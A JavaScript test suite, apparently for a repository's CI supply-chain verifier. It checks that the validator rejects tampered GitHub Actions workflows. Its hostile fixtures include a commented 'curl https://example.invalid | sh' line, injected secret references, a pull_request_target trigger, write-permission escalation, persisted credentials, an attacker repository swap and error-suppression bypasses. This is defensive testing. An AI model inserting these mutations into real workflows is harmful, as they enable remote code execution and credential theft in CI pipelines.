console.log(JSON.stringify({
  suite: "p1-a-semantic-object-path-provenance-controls",
  subject: { commitSha: REJECTED_PR16_AUTHORITY_CLEANLINESS_CANDIDATE,
    path: HISTORICAL_WORKFLOW_PATH, exactBlob: HISTORICAL_WORKFLOW_BLOB },
  topologyObservation: topologyOnlyObservation,
  fullSourceObservation: fullHistoricalObservation,
  syntheticAbsentObservation,
  falseAbsenceInferenceReproduced: true,
  positiveRequired: semanticPositiveControls.length,
  positiveExecuted: semanticPositiveControls.length,
  positivePassed: semanticPositiveOutcomes.filter(Boolean).length,
  hostileRequired: semanticHostileControls.length,
  hostileExecuted: semanticHostileControls.length,
  hostilePassed: semanticHostileOutcomes.filter(Boolean).length,
  objectNotImported: 1,
  pathAbsentInCommit: 0,
  pathPresentInCommit: 1,
  semanticContradictions: 0,
  falseAbsenceClaims: 0,
  unsupportedProvenanceClaims: 0,
  failed: 0, skipped: 0, cancelled: 0, neutral: 0, stale: 0,
  notVerified: 0, notRun: 0, quarantined: 0, flaky: 0,
}));
const invoke = (overrides = {}) => validateDualBaseScope({
  git, candidateSha: validCandidate, evidenceBaseSha: AUTHORIZED_BASE,
  reconciliationBaseSha: TRUSTED_RECONCILIATION_BASE,
  originalCandidateSha: ORIGINAL_CANDIDATE, workflowSha,
  ancestryAuthorityRoot: verifiedAuthorities.ancestry.root,
  trustedReconciliationAuthorityRoot: verifiedAuthorities.trustedReconciliation.root,
  ...overrides,
});
const mutation = (file) => () => invoke({ candidateSha: candidate({ mutate: file }) });
const omission = (file) => () => invoke({ candidateSha: candidate({ omit: file }) });

const identity = {
  candidateSha: "1".repeat(40), workflowSha: "2".repeat(40), baseSha: "3".repeat(40),
  evidenceBaseSha: "4".repeat(40), reconciliationBaseSha: "5".repeat(40),
  originalCandidateSha: "6".repeat(40), runtimePin: "7".repeat(40),
};
const zeros = { failed: 0, skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0 };
const nested = { suite: "p1-a-trusted-certification", ...identity, required: 15, executed: 15, passed: 15, ...zeros, evidenceDigest: "a".repeat(64), verifierDigest: "b".repeat(64) };
const integration = { suite: "p1-a-trusted-verifier-controls", ...identity, required: 21, executed: 21, passed: 21, ...zeros, crossRepositoryCiAuthentication: "VERIFIED", nestedEvidenceDigest: nested.evidenceDigest, nestedVerifierDigest: nested.verifierDigest };
const dualAccounting = { suite: "p1-a-dual-base-verifier-controls", ...identity, required: 29, executed: 29, passed: 29, ...zeros };

const cases = [
  ["dual_base_valid_reconciliation", () => invoke(), false],
  ["candidate_data_valid_reconciliation", () => {
    const summary = candidateDataRun();
    assert.equal(summary.scope, "CANDIDATE_DATA_VALIDATED");
    assert.equal(summary.certified, false);
    assert.equal(summary.failed, 0);
    assert.equal(summary.protectedOperations, 0);
  }, false],
  ["candidate_data_wrong_sha", () => candidateDataRun(validCandidate, {
    P1A_CANDIDATE_SHA: "f".repeat(40),
  }), true],
  ["candidate_data_reversed_parents", () => candidateDataRun(candidate({
    reverseParents: true,
  })), true],
  ["candidate_data_unauthorized_path", () => candidateDataRun(candidate({
    add: "unauthorized.txt",
  })), true],
  ["candidate_data_blob_substitution", () => candidateDataRun(candidate({
    mutate: "docs/security/p1-a/model.json",
  })), true],
  ["candidate_data_historical_root_command", () => candidateDataRun(candidate({
    ciAppend: "\n      - name: obsolete historical root\n        run: pnpm test:p1a-threat-model\n",
  })), true],
  ["candidate_data_workflow_authority_injection", () => candidateDataRun(validCandidate, {
    P1A_WORKFLOW_SHA: workflowSha,
  }), true],
  ["candidate_data_overlapping_trusted_root", () => candidateDataRun(validCandidate, {
    P1A_TRUSTED_EXECUTION_ROOT: repository,
  }), true],
  ["wrong_evidence_model_base", () => invoke({ evidenceBaseSha: "0".repeat(40) }), true],
  ["wrong_trusted_reconciliation_base", () => invoke({ reconciliationBaseSha: AUTHORIZED_BASE }), true],
  ["wrong_original_candidate", () => invoke({ originalCandidateSha: TRUSTED_RECONCILIATION_BASE }), true],
  ["wrong_candidate_sha", () => invoke({ candidateSha: "f".repeat(40) }), true],
  ["candidate_omits_authorized_evidence", omission(CANDIDATE_OWNED_FILES[1]), true],
  ["candidate_omits_resolved_ci", omission(".github/workflows/ci.yml"), true],
  ["candidate_adds_unauthorized_file", () => invoke({ candidateSha: candidate({ add: "unauthorized.txt" }) }), true],
  ["candidate_modifies_trusted_workflow", mutation(".github/workflows/p1a-certify.yml"), true],
  ["candidate_injects_ci_secret", () => invoke({ candidateSha: candidate({ ciAppend: "\n# ${{ secrets.P1A_RUNTIME_APP_PRIVATE_KEY }}" }) }), true],
  ["candidate_modifies_trusted_verifier", mutation("scripts/validate-p1a-threat-model.mjs"), true],
  ["candidate_modifies_accounting_controls", mutation("scripts/validate-p1a-certification-accounting.mjs"), true],
  ["candidate_weakens_credential_cleanup", mutation(".github/workflows/p1a-certify.yml"), true],
  ["candidate_weakens_token_revocation", mutation(".github/workflows/p1a-certify.yml"), true],
  ["trusted_blob_substitution", mutation("scripts/test-p1a-trusted-verifier.mjs"), true],
  ["hidden_file_behind_trusted_exclusion", () => invoke({ candidateSha: candidate({ add: ".github/hidden.yml" }) }), true],
  ["unexpected_trusted_file", mutation(".github/CODEOWNERS"), true],
  ["unexpected_historical_file", () => invoke({ originalCandidateSha: TRUSTED_RECONCILIATION_BASE }), true],
  ["mutable_branch_reference", () => invoke({ reconciliationBaseSha: "codex/bt-1" }), true],
  ["invalid_ancestry", () => invoke({ candidateSha: ORIGINAL_CANDIDATE }), true],
  ["candidate_not_descended_from_reconciliation", () => invoke({ candidateSha: AUTHORIZED_BASE }), true],
  ["copied_original_blobs_without_original_ancestry", () => invoke({ candidateSha: candidate({ omitOriginalParent: true }) }), true],
  ["evidence_digest_mismatch", () => validateCertificationBundle({ nested, dual: dualAccounting, integration: { ...integration, nestedEvidenceDigest: "c".repeat(64) } }, identity), true],
  ["verifier_digest_mismatch", () => validateCertificationBundle({ nested, dual: dualAccounting, integration: { ...integration, nestedVerifierDigest: "c".repeat(64) } }, identity), true],
  ["incomplete_scope_accounting", omission(CANDIDATE_OWNED_FILES.at(-1)), true],
  ["missing_dual_base_identity", () => invoke({ evidenceBaseSha: undefined }), true],
  ["duplicate_or_contradictory_bases", () => invoke({ evidenceBaseSha: TRUSTED_RECONCILIATION_BASE }), true],
  ["local_success_without_protected_remote", () => validateCertificationBundle({ nested, dual: dualAccounting, integration: { ...integration, notRun: 1, passed: 20 } }, identity), true],
  ["stale_evidence_changed_candidate", () => validateCertificationBundle({ nested, integration, dual: dualAccounting }, { ...identity, candidateSha: "8".repeat(40) }), true],
];

const baselineCi = `${git("show", `${COMPOSED_CI_BASE}:.github/workflows/ci.yml`)}\n`;
const trustedCi = `${git("show", `${workflowSha}:.github/workflows/ci.yml`)}\n`;
const validCi = `${git("show", `${validCandidate}:.github/workflows/ci.yml`)}\n`;
const positiveCases = [
  ["exact_baseline_recognized", () => assert.equal(git("rev-parse", `${COMPOSED_CI_BASE}:.github/workflows/ci.yml`), "9a3f1a04f99e83d9dad84cf384d86117a7d282f1")],
  ["baseline_plus_trusted_fragment", () => assert.equal(trustedCi, composeTrustedCi(baselineCi))],
  ["trusted_then_candidate_fragment", () => {
    const trustedFirst = composeTrustedCi(baselineCi);
    const trustedThenCandidate = composeCandidateCi(trustedFirst);
    const candidateSummary = candidateDataRun();
    assert.equal(trustedFirst, trustedCi);
    assert.equal(trustedThenCandidate.split(REQUIRED_CI_ADDITION).length - 1, 1);
    assert.ok(trustedThenCandidate.indexOf("Acquire exact immutable P1-A ancestry authority") < trustedThenCandidate.indexOf(REQUIRED_CI_ADDITION));
    assert.ok(trustedThenCandidate.indexOf("Construct exact trusted-reconciliation authority store") < trustedThenCandidate.indexOf(REQUIRED_CI_ADDITION));
    assert.ok(trustedThenCandidate.indexOf(REQUIRED_CI_ADDITION) < trustedThenCandidate.indexOf("Remove isolated P1-A authority checkouts"));
    assert.ok(REQUIRED_CI_ADDITION.includes("P1A_ANCESTRY_AUTHORITY_ROOT: .p1a-ancestry-authority"));
    assert.ok(REQUIRED_CI_ADDITION.includes("P1A_TRUSTED_RECONCILIATION_AUTHORITY_ROOT: .p1a-trusted-reconciliation-authority"));
    assert.equal(candidateSummary.certified, false);
    assert.equal(candidateSummary.protectedOperations, 0);
  }],
  ["baseline_plus_both_fragments", () => assert.equal(validCi, composeCandidateCi(trustedCi))],
  ["candidate_after_ancestry_authority", () => {
    const authority = validCi.indexOf("Acquire exact immutable P1-A ancestry authority");
    assert.ok(authority >= 0 && authority < validCi.indexOf(REQUIRED_CI_ADDITION));
  }],
  ["candidate_after_trusted_reconciliation_authority", () => {
    const authority = validCi.indexOf("Construct exact trusted-reconciliation authority store");
    assert.ok(authority >= 0 && authority < validCi.indexOf(REQUIRED_CI_ADDITION));
  }],
  ["candidate_before_authority_cleanup", () => assert.ok(validCi.indexOf(REQUIRED_CI_ADDITION) < validCi.indexOf("Remove isolated P1-A authority checkouts"))],
  ["trusted_owned_authority_bindings", () => {
    assert.ok(REQUIRED_CI_ADDITION.includes("P1A_ANCESTRY_AUTHORITY_ROOT: .p1a-ancestry-authority"));
    assert.ok(REQUIRED_CI_ADDITION.includes("P1A_TRUSTED_RECONCILIATION_AUTHORITY_ROOT: .p1a-trusted-reconciliation-authority"));
  }],
  ["immutable_candidate_checkout", () => assert.ok(validCi.includes("ref: ${{ github.event.pull_request.head.sha || github.sha }}"))],
  ["read_only_permissions", () => { assert.ok(validCi.includes("permissions:\n  contents: read")); assert.ok(!validCi.includes("contents: write")); }],
  ["exact_historical_commit_acquired", () => assert.ok(validCi.includes(`ref: ${ORIGINAL_CANDIDATE}`))],
  ["historical_identity_and_blobs_verified", () => { assert.ok(validCi.includes("cat-file -t")); assert.ok(validCi.includes("P1A_ORIGINAL_TEST_BLOB")); assert.ok(validCi.includes("DarksiedCEO/zbestmedia")); }],
  ["original_compatibility_suite_executes", () => assert.ok(validCi.includes("node scripts/test-p1a-trusted-verifier.mjs"))],
  ["baseline_remainder_exact", () => invoke()],
];

const replaceOnce = (source, needle, replacement) => {
  assert.equal(source.split(needle).length - 1, 1, `fixture needle count: ${needle}`);
  return source.replace(needle, replacement);
};
const RETAINED_SOURCE_BINDINGS = [
  "          P1A_TRUSTED_BASE_FULL_SOURCE_ROOT: .p1a-pr16-chain-staging-trusted-base",
  "          P1A_PR16_ACTION_INVENTORY_SOURCE_ROOT: .p1a-pr16-chain-staging-action-inventory",
  "          P1A_PR16_ORIGINAL_AMENDMENT_SOURCE_ROOT: .p1a-pr16-chain-staging-original-amendment",
  "          P1A_PR16_REJECTED_CHAIN_SOURCE_ROOT: .p1a-pr16-chain-staging-rejected-chain",
  "",
].join("\n");
const negativeCases = [
  ["direct_candidate_composition_on_untrusted_baseline", () => composeCandidateCi(baselineCi)],
  ["missing_trusted_fragment", (ci) => replaceOnce(ci, "      - name: Acquire exact original P1-A candidate object\n", "")],
  ["missing_candidate_fragment", (ci) => replaceOnce(ci, "      - name: P1-A candidate-data validation\n", "")],
  ["duplicate_trusted_fragment", (ci) => `${ci}\n      - name: Acquire exact original P1-A candidate object\n`],
  ["duplicate_candidate_fragment", (ci) => `${ci}\n      - name: P1-A candidate-data validation\n`],
  ["modified_trusted_command", (ci) => replaceOnce(ci, "git fetch --no-tags --no-write-fetch-head", "git fetch --no-tags")],
  ["modified_candidate_command", (ci) => replaceOnce(ci, "node scripts/validate-p1a-threat-model.mjs --candidate-data-only", "node scripts/validate-p1a-threat-model.mjs --candidate-data-only || true")],
  ["missing_ancestry_root_binding", (ci) => replaceOnce(ci, "          P1A_ANCESTRY_AUTHORITY_ROOT: .p1a-ancestry-authority\n", "")],
  ["missing_trusted_root_binding", (ci) => replaceOnce(ci, "          P1A_TRUSTED_RECONCILIATION_AUTHORITY_ROOT: .p1a-trusted-reconciliation-authority\n", "")],
  ["candidate_selected_ancestry_root", (ci) => replaceOnce(ci, "          P1A_ANCESTRY_AUTHORITY_ROOT: .p1a-ancestry-authority", "          P1A_ANCESTRY_AUTHORITY_ROOT: ${{ github.event.inputs.ancestry_root }}")],
  ["candidate_selected_trusted_root", (ci) => replaceOnce(ci, "          P1A_TRUSTED_RECONCILIATION_AUTHORITY_ROOT: .p1a-trusted-reconciliation-authority", "          P1A_TRUSTED_RECONCILIATION_AUTHORITY_ROOT: ${{ github.event.inputs.trusted_root }}")],
  ["candidate_before_ancestry_authority", (ci) => replaceOnce(ci, REQUIRED_CI_ADDITION, "").replace("      - name: Acquire exact immutable P1-A ancestry authority", `${REQUIRED_CI_ADDITION}      - name: Acquire exact immutable P1-A ancestry authority`)],
  ["candidate_before_trusted_authority", (ci) => replaceOnce(ci, REQUIRED_CI_ADDITION, "").replace("      - name: Construct exact trusted-reconciliation authority store", `${REQUIRED_CI_ADDITION}      - name: Construct exact trusted-reconciliation authority store`)],
  ["cleanup_before_candidate_validation", (ci) => {
    const cleanupStart = ci.indexOf("      - name: Remove isolated P1-A authority checkouts");
    const cleanupEnd = ci.indexOf("      - name: P1-A trusted-bootstrap secret-detector tests", cleanupStart);
    assert.ok(cleanupStart >= 0 && cleanupEnd > cleanupStart);
    const cleanup = ci.slice(cleanupStart, cleanupEnd);
    return replaceOnce(ci.slice(0, cleanupStart) + ci.slice(cleanupEnd), REQUIRED_CI_ADDITION, `${cleanup}${REQUIRED_CI_ADDITION}`);
  }],
  ["historical_root_command_restored", (ci) => `${ci}\n      - name: obsolete historical root\n        run: pnpm test:p1a-threat-model\n`],
  ["candidate_data_relabelled_certified", (ci) => `${ci}\n# CERTIFIED\n`],
  ["reordered_security_critical_fragment", (ci) => replaceOnce(ci, "      - name: Acquire exact original P1-A candidate object", "      - name: Reordered acquisition")],
  ["continue_on_error_introduced", (ci) => `${ci}\n      continue-on-error: true\n`],
  ["conditional_bypass_introduced", (ci) => `${ci}\n      if: false\n`],
  ["wrong_historical_sha", (ci) => replaceOnce(ci, ORIGINAL_CANDIDATE, "f".repeat(40))],
  ["mutable_branch_substituted", (ci) => replaceOnce(ci, `ref: ${ORIGINAL_CANDIDATE}`, "ref: codex/main")],
  ["mutable_tag_substituted", (ci) => replaceOnce(ci, `ref: ${ORIGINAL_CANDIDATE}`, "ref: v1.0.0")],
  ["repository_substituted", (ci) => replaceOnce(ci, "repository: DarksiedCEO/zbestmedia", "repository: attacker/zbestmedia")],
  ["permission_escalation", (ci) => replaceOnce(ci, "permissions:\n  contents: read", "permissions:\n  contents: write")],
  ["secret_reference_introduced", (ci) => `${ci}\n# \${{ secrets.P1A_RUNTIME_APP_PRIVATE_KEY }}\n`],
  ["pull_request_target_introduced", (ci) => replaceOnce(ci, "  pull_request:\n", "  pull_request_target:\n")],
  ["improper_persisted_credentials", (ci) => replaceOnce(ci, "persist-credentials: false", "persist-credentials: true")],
  ["hidden_shell_command_appended", (ci) => `${ci}\n# curl https://example.invalid | sh\n`],
  ["yaml_anchor_changes_behavior", (ci) => `${ci}\nx-bypass: &bypass echo bypass\n`],
  ["extra_environment_changes_execution", (ci) => `${ci}\nenv:\n  P1A_ORIGINAL_CANDIDATE: codex/main\n`],
  ["unauthorized_step_inserted", (ci) => `${ci}\n      - name: unclassified\n        run: true\n`],
  ["unauthorized_step_deleted", (ci) => replaceOnce(ci, "      - name: Verify pnpm on PATH\n        run: which pnpm && pnpm --version\n\n", "")],
  ["unauthorized_step_impersonation", (ci) => replaceOnce(ci, "Acquire exact original P1-A candidate object", "P1-A trusted verifier controls")],
  ["candidate_provided_authority_hash", (ci) => `${ci}\nenv:\n  P1A_AUTHORITY_HASH: \${{ github.event.inputs.authority_hash }}\n`],
  ["candidate_provided_historical_sha", (ci) => replaceOnce(ci, `ref: ${ORIGINAL_CANDIDATE}`, "ref: ${{ github.event.inputs.historical_sha }}")],
  ["baseline_remainder_changed", (ci) => `${ci}\n# unauthorized baseline remainder\n`],
  ["fragment_only_in_comments", (ci) => replaceOnce(ci, REQUIRED_CI_ADDITION, "# P1-A candidate-data validation\n# --candidate-data-only\n")],
  ["fragment_only_in_dead_conditional", (ci) => replaceOnce(ci, "      - name: P1-A candidate-data validation\n", "      - name: P1-A candidate-data validation\n        if: ${{ false }}\n")],
  ["trusted_fragment_candidate_script", (ci) => replaceOnce(ci, "git fetch --no-tags --no-write-fetch-head .p1a-original-candidate", "node candidate/untrusted.mjs")],
  ["accounting_without_both_authorities", (ci) => replaceOnce(ci, "      - name: Acquire exact original P1-A candidate object\n", "      - name: authority accounting claims complete\n")],
  ["retained_source_bindings_omitted", (ci) => replaceOnce(ci, RETAINED_SOURCE_BINDINGS, "")],
  ["retained_source_bindings_duplicated", (ci) => replaceOnce(ci, RETAINED_SOURCE_BINDINGS,
    `${RETAINED_SOURCE_BINDINGS}${RETAINED_SOURCE_BINDINGS}`)],
  ["retained_source_bindings_reordered_after_verifier", (ci) => replaceOnce(
    replaceOnce(ci, RETAINED_SOURCE_BINDINGS, ""),
    "        run: node scripts/test-p1a-dual-base-verifier.mjs\n",
    `        run: node scripts/test-p1a-dual-base-verifier.mjs\n${RETAINED_SOURCE_BINDINGS}`)],
  ["retained_source_wrong_checkout", (ci) => replaceOnce(ci,
    ".p1a-pr16-chain-staging-trusted-base", ".p1a-pr16-chain-staging-rejected-cleanliness")],
  ["retained_source_primary_checkout", (ci) => replaceOnce(ci,
    ".p1a-pr16-chain-staging-trusted-base", ".")],
  ["retained_source_topology_only_authority", (ci) => replaceOnce(ci,
    ".p1a-pr16-chain-staging-trusted-base", ".p1a-pr16-remediation-chain-authority")],
  ["retained_source_partial_fragment", (ci) => replaceOnce(ci,
    "          P1A_PR16_REJECTED_CHAIN_SOURCE_ROOT: .p1a-pr16-chain-staging-rejected-chain\n", "")],
  ["retained_source_historical_profile_substitution", (ci) => replaceOnce(ci,
    ".p1a-pr16-chain-staging-action-inventory", ".p1a-pr16-chain-staging-original-amendment")],
  ["retained_source_parser_uncertainty", (ci) => replaceOnce(ci,
    "          P1A_TRUSTED_BASE_FULL_SOURCE_ROOT:", "         P1A_TRUSTED_BASE_FULL_SOURCE_ROOT:")],
];

const summarize = (outcomes, required = outcomes.length) => {
  assert.equal(outcomes.length, required, "suite required/executed mismatch");
  const passed = outcomes.filter(Boolean).length;
  const summary = Object.freeze({ required, executed: outcomes.length, passed, failed: outcomes.length - passed });
  assert.equal(summary.passed + summary.failed, summary.executed, "suite accounting invariant violated");
  return summary;
};
const accountingIsolationCases = [
  () => assert.deepEqual(summarize([false, true]), { required: 2, executed: 2, passed: 1, failed: 1 }),
  () => assert.equal(summarize([true]).failed, 0),
  () => assert.equal(summarize([false]).failed, 1),
  () => assert.equal(summarize([true, true]).passed, 2),
  () => assert.throws(() => summarize([true], 2)),
  () => { const dual = summarize([false]); const composed = summarize([true]); assert.equal(dual.failed, 1); assert.equal(composed.failed, 0); },
  () => { const positive = summarize([true]); const negative = summarize([false]); assert.equal(positive.failed, 0); assert.equal(negative.failed, 1); },
  () => { const first = summarize([false]); const second = summarize([true]); assert.notEqual(first.failed, second.failed); },
  () => { const source = [true]; const first = summarize(source); source[0] = false; assert.equal(first.failed, 0); },
  () => { const fresh = summarize([true]); assert.equal(fresh.failed, 0, "stale failure leaked into fresh suite"); },
];
const accountingOutcomes = accountingIsolationCases.map((operation, index) => {
  try { operation(); console.log(`PASS accounting_isolation:${index + 1}`); return true; }
  catch (error) { console.error(`FAIL accounting_isolation:${index + 1}: ${error.message}`); return false; }
});
const dualOutcomes = [];
const positiveOutcomes = [];
const negativeOutcomes = [];
try {
  for (const [name, operation, shouldReject] of cases) {
    let rejected = false;
    let detail = "";
    try { operation(); } catch (error) { rejected = true; detail = error.message; }
    const passed = rejected === shouldReject;
    dualOutcomes.push(passed);
    if (passed) console.log(`PASS ${name}`);
    else console.error(`FAIL ${name}${detail ? `: ${detail}` : ""}`);
  }
  for (const [name, operation] of positiveCases) {
    try { operation(); positiveOutcomes.push(true); console.log(`PASS composed_positive:${name}`); }
    catch (error) { positiveOutcomes.push(false); console.error(`FAIL composed_positive:${name}: ${error.message}`); }
  }
  for (const [name, transform] of negativeCases) {
    let rejected = false;
    try { invoke({ candidateSha: candidate({ ciTransform: transform }) }); }
    catch { rejected = true; }
    negativeOutcomes.push(rejected);
    if (rejected) console.log(`PASS composed_negative:${name}`);
    else console.error(`FAIL composed_negative:${name}: mutation survived`);
  }
} finally { rmSync(temporary, { recursive: true, force: true }); }
const dualSummary = summarize(dualOutcomes, cases.length);
const positiveSummary = summarize(positiveOutcomes, positiveCases.length);
const negativeSummary = summarize(negativeOutcomes, negativeCases.length);
const accountingSummary = summarize(accountingOutcomes, accountingIsolationCases.length);
const presenceSimulationSummary = summarize(presenceSimulationOutcomes, presenceSimulationControls.length);
const canonicalPositiveSummary = summarize(canonicalPositiveOutcomes, canonicalPositiveControls.length);
const canonicalHostileSummary = summarize(canonicalHostileOutcomes, canonicalHostileControls.length);
const trustedDagPositiveSummary = summarize(trustedDagPositiveOutcomes, trustedDagPositiveControls.length);
const trustedDagHostileSummary = summarize(trustedDagHostileOutcomes, trustedDagHostileControls.length);
const reconciliationFixturePositiveSummary = summarize(reconciliationFixturePositiveOutcomes, 10);
const reconciliationFixtureHostileSummary = summarize(reconciliationFixtureHostileOutcomes, 25);
console.log(JSON.stringify({
  suite: "p1-a-canonical-bounded-ancestry-propagation-controls",
  positiveRequired: canonicalPositiveSummary.required,
  positiveExecuted: canonicalPositiveSummary.executed,
  positivePassed: canonicalPositiveSummary.passed,
  hostileRequired: canonicalHostileSummary.required,
  hostileExecuted: canonicalHostileSummary.executed,
  hostilePassed: canonicalHostileSummary.passed,
  boundarySha: AUTHORIZED_BASE,
  preBoundaryParentSha: PRE_BASE_PARENT,
  nativeMergeBase: true,
  failed: canonicalPositiveSummary.failed + canonicalHostileSummary.failed,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-trusted-reconciliation-dag-controls",
  exactCommitCount: TRUSTED_RECONCILIATION_DAG.length,
  exactDescendantCount: TRUSTED_RECONCILIATION_DAG.length - 1,
  positiveRequired: trustedDagPositiveSummary.required,
  positiveExecuted: trustedDagPositiveSummary.executed,
  positivePassed: trustedDagPositiveSummary.passed,
  hostileRequired: trustedDagHostileSummary.required,
  hostileExecuted: trustedDagHostileSummary.executed,
  hostilePassed: trustedDagHostileSummary.passed,
  boundarySha: AUTHORIZED_BASE,
  trustedHeadSha: TRUSTED_RECONCILIATION_BASE,
  failed: trustedDagPositiveSummary.failed + trustedDagHostileSummary.failed,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-reconciliation-fixture-propagation-controls",
  positiveRequired: reconciliationFixturePositiveSummary.required,
  positiveExecuted: reconciliationFixturePositiveSummary.executed,
  positivePassed: reconciliationFixturePositiveSummary.passed,
  hostileRequired: reconciliationFixtureHostileSummary.required,
  hostileExecuted: reconciliationFixtureHostileSummary.executed,
  hostilePassed: reconciliationFixtureHostileSummary.passed,
  beforeFailureReproduced: reconciliationFailureBeforePropagation,
  boundarySha: AUTHORIZED_BASE,
  trustedHeadSha: TRUSTED_RECONCILIATION_BASE,
  failed: reconciliationFixturePositiveSummary.failed + reconciliationFixtureHostileSummary.failed,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-pre-base-parent-presence-simulation-controls",
  ...presenceSimulationSummary,
  forbiddenSha: PRE_BASE_PARENT,
  realParentAbsent: true,
  simulatedPresenceRejected: true,
  realObjectStoreUnchanged: true,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-bounded-ancestry-root-controls",
  positiveRequired: 10, positiveExecuted: 10, positivePassed: 10,
  hostileRequired: boundedRootHostileCases.length,
  hostileExecuted: boundedRootHostileCases.length,
  hostilePassed: boundedRootHostilePassed,
  boundarySha: AUTHORIZED_BASE,
  preBoundaryParentSha: PRE_BASE_PARENT,
  withoutBoundaryFailureReproduced: true,
  withBoundaryMergeBasePassed: true,
  preBoundaryParentAbsent: true,
  failed: boundedRootHostileCases.length - boundedRootHostilePassed,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-isolated-trusted-authority-controls",
  positiveRequired: 4,
  positiveExecuted: 4,
  positivePassed: 4,
  hostileRequired: hostileAuthorityCases.length,
  hostileExecuted: hostileAuthorityCases.length,
  hostilePassed: authorityHostilePassed,
  shallowFailureReproduced,
  failed: hostileAuthorityCases.length - authorityHostilePassed,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-evidence-base-authority-controls",
  positiveRequired: 1, positiveExecuted: 1, positivePassed: 1,
  hostileRequired: evidenceBaseHostileCases.length,
  hostileExecuted: evidenceBaseHostileCases.length,
  hostilePassed: evidenceBaseHostilePassed,
  failed: evidenceBaseHostileCases.length - evidenceBaseHostilePassed,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-immutable-ancestry-authority-controls",
  positiveRequired: 1, positiveExecuted: 1, positivePassed: 1,
  hostileRequired: ancestryHostileCases.length,
  hostileExecuted: ancestryHostileCases.length,
  hostilePassed: ancestryHostilePassed,
  failed: ancestryHostileCases.length - ancestryHostilePassed,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-dual-base-verifier-controls",
  candidateSha: process.env.P1A_CANDIDATE_SHA ?? null,
  workflowSha: process.env.P1A_WORKFLOW_SHA ?? null,
  baseSha: process.env.P1A_TRUST_BASE_SHA ?? null,
  evidenceBaseSha: process.env.P1A_EVIDENCE_BASE_SHA ?? null,
  reconciliationBaseSha: process.env.P1A_RECONCILIATION_BASE_SHA ?? null,
  originalCandidateSha: process.env.P1A_ORIGINAL_CANDIDATE_SHA ?? null,
  runtimePin: process.env.P1A_TRUST_RUNTIME_PIN ?? null,
  ...dualSummary,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-composed-ci-authority-controls",
  positiveRequired: positiveSummary.required, positiveExecuted: positiveSummary.executed, positivePassed: positiveSummary.passed,
  negativeRequired: negativeSummary.required, negativeExecuted: negativeSummary.executed, negativePassed: negativeSummary.passed,
  behaviorChangingMutationSurvivors: negativeSummary.failed,
  failed: positiveSummary.failed + negativeSummary.failed,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
console.log(JSON.stringify({
  suite: "p1-a-suite-accounting-isolation-controls",
  ...accountingSummary,
  skipped: 0, cancelled: 0, neutral: 0, stale: 0, notVerified: 0, notRun: 0,
}));
if (dualSummary.failed || positiveSummary.failed || negativeSummary.failed || accountingSummary.failed
  || presenceSimulationSummary.failed
  || canonicalPositiveSummary.failed || canonicalHostileSummary.failed
  || trustedDagPositiveSummary.failed || trustedDagHostileSummary.failed
  || authorityHostilePassed !== hostileAuthorityCases.length
  || evidenceBaseHostilePassed !== evidenceBaseHostileCases.length
  || ancestryHostilePassed !== ancestryHostileCases.length
  || boundedRootHostilePassed !== boundedRootHostileCases.length) process.exitCode = 1;
